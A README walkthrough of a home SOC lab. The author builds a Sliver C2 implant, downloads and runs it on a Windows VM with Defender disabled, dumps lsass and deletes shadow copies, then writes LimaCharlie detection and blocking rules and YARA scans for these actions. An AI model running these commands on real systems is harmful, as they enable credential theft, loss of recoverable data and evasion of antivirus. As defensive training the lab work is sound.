
<h1>SOC Analyst Home Lab</h1>


 

<h2>Description</h2>
Setting up 2 VM machine to mimic a SOC environment. One Linux VM to emulate and attacker. Installing Sysmon on Windows VM for telemetry on our Windows endpoint. Installing LimaCharlie EDR on our Windows VM using as a cross-platform EDR agent, that also handles all of the log shipping/ingestion and a plus having a threat detection engine. Using our Kali Linux VM we are going to make some noise, generating C2 payload and and then proceeding to our command and control session. We will also craft our own detection rules and proceeding to block any attacks. Lastly we are going to use some YARA scanning, the goal is to take advantage of a more advanced capability. To automatically scan files or processes for the presence of malware based on a YARA signature. 

<br />


<h2>Languages and Utilities Used</h2>

- <b>PowerShell</b> 
- <b>Linux</b>
- <b>Sysmon</b>
- <b>LimaCharlie</b>
- <b>YARA</b>
- <b>C2 session payload</b>

<h2>Environments Used </h2>

- <b>Windows 10</b> (21H2)
- <b>Ubuntu Server 22.04</b>
- <b>Kali Linux (attack machine)</b>

<h2>Program walk-through:</h2>
<br/>
<br/>

<p align="center">
<h3>Part One (Install & setting up VMs:</h3>
Installing Ubuntu: <br/>
We need to take a few steps to set our static IP address for this VM.<br/>
<br />
<img src="https://i.imgur.com/nl6DEQ6.png"/>
<br />
<br />
Finding out the gateway IP of your VMware workstation NAT network:  <br/>
VMware workstation > click Edit menu on top > Click "Virtual Network Editor" > Select Type : "NAT" network > and click "NAT Settings" > make sure to take down the Gateway address IP and Subnet mask <br/>
<br />
<img src="https://i.imgur.com/BwFP3Er.png"/>
<br />
<br />
Now back to Ubuntu Installer we are going to change the interface from DHCPv4 to Manual or static: <br/>
Now got back to Network Connections > drop down to "ens33 eth" and select "edit IPv4" > after that select "Manual" > now a window has appeared and just plug in the required IP from our previous steps <br/>
<br />
<img src="https://i.imgur.com/9JN0v2l.png"/>
<br />
<br />
Continue to Install Ubuntu:  <br/>
Once Static IP has been set > continue to next installer > Make sure to set memorable username/password > Next step "Install OpenSSH server" > then continue isntalling OS until "Install Complete" and hit "reboot now" <br/>
<br />
<img src="https://i.imgur.com/EtZPCjM.png"/>
<br />
<br />
Installation and Reboot complete:  <br/>
After reboot now we make sure DNS and outbound pings are working > make sure to login in with the your credentials > type in "ping -c 2 google.com" > looks like we pinged right now we are all set for our ubuntu server <br/>
<br />
<img src="https://i.imgur.com/0pTReUk.png"/>
<br />
<br />
Windows 10 ent VM configurations:  <br/>
Disabling the Windows defender so it doesn't interfere with the shady stuff we are planning to do. Here are the few steps I did: <br/>
Disabling Tamper Protection > click "Start" > "Settings" > "Privacy & Security" > " Windows Security" > "Virus & threat protection" > Under this tab click " Manage settings" > Toggle off the "Tamper Protection"<br/>
<br /> 
<img src="https://i.imgur.com/9R3wDfE.png"/>
<br />
<br />
Permanently Disable defender via group policy editor:  <br/>
click "start" menu > type "cmd" into the search bar > Right click "command promt" and click " Run as administrator" and then run the following Command "gpedit.msc" <br/>
<img src="https://i.imgur.com/wIcheNb.png"/>
<br />
Also we can disable defendiar via Group Policy Editor : <br/>
Click computer configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Double-click "Turn off Microsoft Defender Antivirus"> select "Enabled" > click apply and ok <br/>
<br />
Permanently Disable Defender via Registry: <br/>
Open cmd promt with administrative privileges and type the following command: "REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
<img src="https://i.imgur.com/CBejFpA.png"/>
<br />
Installing Sysmon in Windows VM: <br/>
Now launch Administrative Powershell > Download Syszmon with the following command > "Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip" <br/>
We unzip Sysmon.zip using this command: "Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon" <br/>
After that we Download SwiftOnSecurity's Sysmon config with these set of commands > "Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml" <br/>
Installing sysmon with Swift's config: "C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml"<br/>
Lastly we check for the presence of sysmon Event Logs : Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10<br/>
<br />
<img src="https://i.imgur.com/RTFCNpJ.png"/>
<img src="https://i.imgur.com/qCbiNb9.png"/>
<img src="https://i.imgur.com/JxcYpnq.png"/>
<br />
Installing LimaCharlie EDR on our Windows VM: <br/>
Creating a free LimaCharlie Account <br/>
Once Logged into LimaCharlie, create an organization: Name: anything but must be unique > Data residency: USA > Template: Extended Detection & Response Standard <br/>
<img src="https://i.imgur.com/vnoK5x9.png"/>
<br/>
Once you've created the organization we proceed to adding a sensor > Click "Add Sensor" > Now we are going to create an installation key: Select an installation key "Windows" > click create > select the installation key we just created > specify the x86-64 (.exe) > after that don't do anything or download the selected installer. <br/>
<img src="https://i.imgur.com/bmss0H7.png"/>
<img src="https://i.imgur.com/bf1l4NW.png"/>
<br />
WE go bac kto the Windows VM, open an administrative Powershell prompt and enter the following commands: "cd C:\Users\Win10 Ent\Downloads" > next we type these commands "Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe" > now we shift to a standard command by running "cmd.exe" > next we go back to Limacharlie go to the number 4 bullet and copy the command then paste it and enter. <br/> 
<br />
<img src="https://i.imgur.com/LDrYtaz.png"/>
<img src="https://i.imgur.com/bf1l4NW.png"/>
<img src="https://i.imgur.com/RNXJqPG.png"/> 
<br />
Once we've done everything and worked correctly, once we go back to the LimaCharlie web UI we should be able to see a sensor reporting in like so:<br/>
<img src="https://i.imgur.com/0quhJNQ.png"/> 
<br />
# In this step we are going to configure Limacharlie to also ship the Sysmon event logs alongside its own EDR telemetry   <br/>
a. in the left side menu click "Artifact Collection" <br/>
b. click "Add Rule" > enter "windows-sysmon-logs as the name > for platforms type "Windows" > path pattern will be: wel://Microsoft-Windows-Sysmon/Operational:* > retention period will be "10" > after this click "save" <br/>
by doing this we are now going to start shipping sysmon logs which provide a wealth of EDR-like telemetry, some of which is redundant to LC's own telemetry \. <br/>
<br />
Now ths will be our last step for our Part one: <br/>
<br />
# For this step I just used my host system and used SSH to access our Ubuntu VM. <br/>
# Using the static IP address of our Ubuntu we can SSH to it using this command: "ssh user@[ubuntu IP] <br/>
# Once we SSH successfully we can "sudo su" to make our life easier and have root privilege <br/>
# We proceed to download Sliver, a C2 framework by Bishopfox. We are going to use these set of commands in order to download. <br/>
# Download Sliver Linux Server binary : "wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server" <br/>
# We make it executable by changing the permissions using these command: "chmod +x /usr/local/bin/sliver-server" <br/>
# I recommend installing mingw-w64 for additional capabiities: enter this command in our SSH console "apt install -y mingw-w64" <br/>
# Now lastly we create a working directory that we will use in future steps : enter this command : "mkdir -p /opt/sliver" <br/>
<br />
<br />
<br />
<h3>Part Two (Generating C2 Payload & LimaCharlie Telemtry):</h3>
<br />
We drop into a root shell and change directory to our sliver install: "sudo su" > cd "/opt/sliver" <br/>
<img src="https://i.imgur.com/j8O21Vc.png"/> 
Launch Sliver server with this command "sliver-server" <br/>
<img src="https://i.imgur.com/zwH9oab.png"/> 
<br /> 
Now we Generate our first C2 session payload > wihtin our sliver shell we type this command and be sure to to use our Ubuntu IP: "generate --http [Linux_VM_IP] --save /opt/sliver" > Confirm the new implant config with "implant" command <br/>
<img src="https://i.imgur.com/wKazdBz.png"/>
Now we successfully have a C2 payload that we can drop onto our Windows VM. We can exit our Sliver server for now and type "exit" <br/>
Now moving to downloading our C2 payload from our Ubuntu VM to the Windows VM.<br/>
Type in this command "cd /opt/sliver/" > and then type this command to temporarily spin up a web server "python3 -m http.server 80" <br/>
Now switching to our Windows VM we have to launch Admin Powershell console. Enter this command on our Powershell console "IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe" <br/>
<img src="https://i.imgur.com/aaTzpPZ.png"/>
<br />
Starting our C2 session > stop our python we server > then relaunch sliver by typing "sliver-server"  <br/>
Starting the Sliver HTTP listener by entering this command "http" <br/>
<img src="https://i.imgur.com/ouSY73n.png"/>
<br/>
we return to our Windows CM and execute the C2 payload from our downloads folder using the same Administrator command prompt. Type in this command "C:\Users\Win10 Ent\Downloads\PEACEFUL_TRACK.exe" <br/>
We can verify our sliver session by using the "session" command and taking note of the session ID. <br/>
<img src="https://i.imgur.com/qacqG0g.png"/>
<br />
To interact with our new C2 sessions we can type the following command "use[session_id]" make sure to put the session ID of your C2 payload <br/>
Now we are directly interacting with our C2 session on the Windows VM. I am going to run few basic commands just get basic infor or bearings on our victim's host. Use the following command: "info" > "whoami" > "getprivs" <br/>
<img src="https://i.imgur.com/TaXgJzS.png"/>
 <br />
With the "getprivs" command we can see that our C2 payload was implanted properly running with Admin rights. as a proof we can check the "SeDebugPrivilege" enabled. showing that we are on the right track. <br/>
<img src="https://i.imgur.com/w4p7Hcy.png"/>
 <br />
Typing in the "netstat" command we can examine network connections occurring on the remote systems. Notice that sliver highlights it's own process in green. <br/>
 <br />
<img src="https://i.imgur.com/qHt7mmn.png"/>
 <br />
Typing the "ps -T" command we can identify running processes on the remote system. We can see that Sliver cleverly highights it's own process in green and any detected countermeasures or defensive tools in red. <br/>
<img src="https://i.imgur.com/BloIdRV.png"/>
<br /> 
Now With all that we can Observe what we have so far checking our EDR Telemetry. <br/>
Let's go back to our LimaCharli'es web UI. > click "sensors" on the left menu and then click on our active windows sensor > after that click "Processes" on the left menu. <br/>
One of the easiest ways to spot unusual processes is to simply look for ones that are NOT signed. <br/>
<img src="https://i.imgur.com/3NlMLgG.png"/>
<br/>
Moving on we go to our "Network tab on the left. Where we can search for our implant name of C2 IP addr. <br/>
<img src="https://i.imgur.com/FkOrfSJ.png"/>
<br/>
We can also click on "File System" on the left tab menu. Brows to the location we know where our implant is running from. and then once we find it we can inspect the hash of the suspicious executable by scanning it with VirusTotal. <br/>
<img src="https://i.imgur.com/luMyRqv.png"/>
<img src="https://i.imgur.com/wjkoMhe.png"/>
NOTE: “Item not found” on VT does not mean that this file is innocent, just that it’s never been seen before by VirusTotal. This makes sense because we just generated this payload ourselves, so of course it’s not likely to be seen by VirusTotal before. <br/>
<br />
Click “Timeline” on the left-side menu of our sensor. This is a near real-time view of EDR telemetry + event logs streaming from this system. <br/>
<img src="https://i.imgur.com/C8w7mo3.png"/>
<br /> 
<h3>Part Three (Emulating an adversary):</h3>
<br />
# Let's jump back into our Sliver C2 session where we used our SSH <br/>
# We will run the following commands within Sliver session on our victim host. Like what we did in our previous steps I went and checked our privileges by typing the command "getprivs" Once we confirm Admin privileges. We can run "procdump -n lsass.exe -s lsass.dmp" <br/>
# This will dump the remote process from memory, and save it locally on your Sliver C2 server. Now we can move on back to our Lima Charlie and find relevant telemetry. <br/>
<br /> 
# Since lsass.exe is a known sensitive process often targeted by credential dumping tools, any good EDR will generate events for this.
Drill into the Timeline of your Windows VM sensor and use the “Event Type Filters” to filter for “SENSITIVE_PROCESS_ACCESS” events.<br/>
<br/>
<img src="https://i.imgur.com/E54Epf3.png"/>
<br/>
# Now that we know what the event looks like when credential access occurred, we have what we need to craft a detection & response (D&R) rule that would alert anytime this activity occurs.<br/>
# Click the event a small popup show up and click the detect button on the top right of the pop-up window to begin building a detection rule based on this event.<br/>
# In the “Detect” section of the new rule, remove all contents and replace them with this :<br/>
  event: SENSITIVE_PROCESS_ACCESS<br/>
  op: ends with<br/>
  path: event/*/TARGET/FILE_PATH<br/>
  value: lsass.exe<br/>
<br/>
# We’re specifying that this detection should only look at SENSITIVE_PROCESS_ACCESS events where the victim or target process ends with lsass.exe<br/>
# In the “Respond” section of the new rule, remove all contents and replace them with this<br/>
  - action: report<br/>
    name: LSASS access<br/>
# We’re telling LimaCharlie to simply generate a detection “report” anytime this detection occurs<br/>
<br/>
# Now let’s test our rule against the event we built it for. Click “Target Event” below the D&R rule we just wrote.<br/>
# Scroll to the bottom of the raw event and click “Test Event” to see if our detection would work against this event.<br/>
<img src="https://i.imgur.com/6iosL65.png"/>
<br/>
# Scroll back up and click “Save Rule” and give it the name “LSASS Accessed” and be sure it is enabled. <br/>
# We return to our Sliver server console, back into your C2 session, and rerun our same procdump command from our previous steps.<br/>
# After rerunning the procdump command, go to the “Detections” tab on the LimaCharlie main left-side menu.<br/>
# We've just detected a threat with our own detection signature! Expand the detection if we want to see the raw event.<br/>
<img src="https://i.imgur.com/Jv0VjW1.png"/>
<br /> 
<h3>Part Four (Blocking an attack):</h3>
<br />
# We get back onto an SSH session on the Linux VM, and drop into a C2 session with our victim. In our Sliver C2 shell on the victim, run the basic command we’re looking to detect and block. Type the command "shell"<br/>
# When prompted with “This action is bad OPSEC, are you an adult?” type Y and hit enter. <br/>
# In the new System shell, run the following command: "vssadmin delete shadows /all" NOTE: The output is not important as there may or not be Volume Shadow Copies available on the VM to be deleted, but running the command is sufficient to generate the telemetry we need.<br/>
# Run the whoami command to verify we still have an active system shell. Type the command "whoami"<br/>
<br/>
<img src="https://i.imgur.com/VUrNMSP.png"/>
<br/>
# Now we return to our LC Web UI and go to our detection tab to see if default Sigma picked up on our shenanigans. On our photo below we can see the event "shadow copies deletion"<br/>
<img src="https://i.imgur.com/TFxJSHm.png"/>
<br/>
# Click to expand the detection and examine all of the metadata contained within the detection itself. One of the great things about Sigma rules is they are enriched with references to help you understand why the detection exists in the first place.<br/>
# View the offending event in the Timeline to see the raw event that generated this detection.<br/>
# Once we are in the timeline, we can again craft a detection & response D&R rule from this event. for this follow our previous steps. <br/>
# Now looking at D&R rule template, we can begin crafting our response action that will take place when this activity is observed. <br/>
# Add the following Response rule to the Respond section:<br/>
  - action: report <br/>
  name: vss_deletion_kill_it <br/>
- action: task<br/>
  command:<br/>
    - deny_tree<br/>
    - <<routing/parent>><br/>
# we save our rule with the following name: vss_deletion_kill_it <br/>
<br/>
# Now return to our Sliver C2 session, and rerun the "vssadmin delete shadows /all" command and see what happens.<br/>
# The command should succeed, but the action of running the command is what will trigger our D&R rule <br/>
# we can test if our D&R rule properly terminated the parent process, check to see if you still have an active system shell by rerunning the "whoami" command.<br/>
# If our D&R rule worked successfully, the system shell will hang and fail to return anything from the whoami command, because the parent process was terminated.<br/>
<img src="https://i.imgur.com/o9b0zZe.png"/>
<br />
<br />
<h3>Part Five (Detection rule & YARA scans):</h3>
# this is going to be the last part of our project. Thanks for sticking out!!! <br/>
# YARA is a tool primarily used for identifying and classifying malware based on textual or binary patterns. It allows researchers and security professionals to craft rules that describe unique characteristics of specific malware families or malicious behaviors. These rules can then be applied to files, processes, or even network traffic to detect potential threats.<br/>
# Within LimaCharlie, browse to “Automation” > “YARA Rules”<br/>
<img src="https://i.imgur.com/ArKrmNW.png"/>   
# Name the rule sliver. Copy and paste the contents of this into the Rule block<br/>
# https://gist.githubusercontent.com/ecapuano/2c59ff1ea354f1aae905d6e12dc8e25b/raw/831d7b7b6c748f05123c6ac1a5144490985a7fe6/sliver.yara <br/>
<img src="https://i.imgur.com/M1UOXfb.png"/>        
# Click "Save Rule" <br/>
<br />
# Now create one more YARA rule that we’ll use later on for a more specific purpose <br/>
# Name the rule sliver-process Copy and paste the contents of this gist into the Rule block.
  https://gist.githubusercontent.com/ecapuano/f40d5a99d19500538984bd88996cfe68/raw/12587427383def9586580647de13b4a89b9d4130/sliver_broad.yara <br/>
# Now, before we use these YARA rules, we want to setup a few generic D&R rules that will generate alerts whenever a YARA detection occurs.
Browse to “Automation” > “D&R Rules” <br/>
Create a new rule <br/>
In the Detect block, paste the following <br/>
 event: YARA_DETECTION <br/>
 op: and <br/> 
 rules: <br/> 
   - not: true <br/>
     op: exists <br/>
     path: event/PROCESS/* <br/>
   - op: exists <br/>
     path: event/RULE_NAME <br/>
# Notice that we’re detecting on YARA detections not involving a PROCESS object, that’ll be its own rule shortly.
In the Respond block, paste the following <br/>
  - action: report <br/>
  name: YARA Detection {{ .event.RULE_NAME }} <br/>
- action: add tag <br/>
  tag: yara_detection <br/>
  ttl: 80000 <br/> 
<img src="https://i.imgur.com/3iUp4LN.png"/>
# Save the rule and title it YARA Detection <br/>
# Create another rule .In the Detect block, paste the following <br/>
     event: YARA_DETECTION <br/>
op: and <br/>
rules: <br/> 
  - op: exists <br/>
    path: event/RULE_NAME <br/>
  - op: exists <br/>
    path: event/PROCESS/* <br/>
# Notice that this detection is looking for YARA Detections specifically involving a PROCESS object. In the Respond block, paste the following<br/>
   - action: report <br/>
  name: YARA Detection in Memory {{ .event.RULE_NAME }} <br/>
- action: add tag <br/>
  tag: yara_detection_memory <br/>
  ttl: 80000 <br/>
<img src="https://i.imgur.com/wvDHkZk.png"/>
# Let’s test our new YARA signature <br/>
# In LimaCharlie, browse to the “Sensors List” and click on our Windows VM sensor <br/> 
<img src="https://i.imgur.com/mw8Cnjn.png"/>
# Access the EDR Sensor Console which allows us to run sensor commands against this endpoint <br/>
<img src="https://i.imgur.com/g4jIaLk.png"/>
# Run the following command to kick off a manual YARA scan of our Sliver payload. You will need to know the name of your Sliver executable created in Part 2 <br/> 
# Replace [payload_name] with your actual payload name <br/>
<img src="https://i.imgur.com/P9gXOXS.png"/>
# Hit enter twice to execute this command. Ideally, your output looks similar to mine below, indicating a positive hit on one of the signatures contained within the Sliver YARA rule. 
<img src="https://i.imgur.com/5ZXI2bt.png"/>
# Now, also confirm that you have a new Detection on the “Detections” screen <br/>
<img src="https://i.imgur.com/9mHyl6q.png"/>
# Since we already know we have a Sliver implant sitting in the Downloads folder of our Windows VM, we can easily test our signature by initiating a manual YARA scan using the EDR sensor. This will give us a sanity check that all things are working up to this point. Also, We automated this process. 

<h2>If you read my entire project Thank you so much for sticking out! I know it was boring but hope you learned a few things from it!!! </h2>






</p>

<!--
 ```diff
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
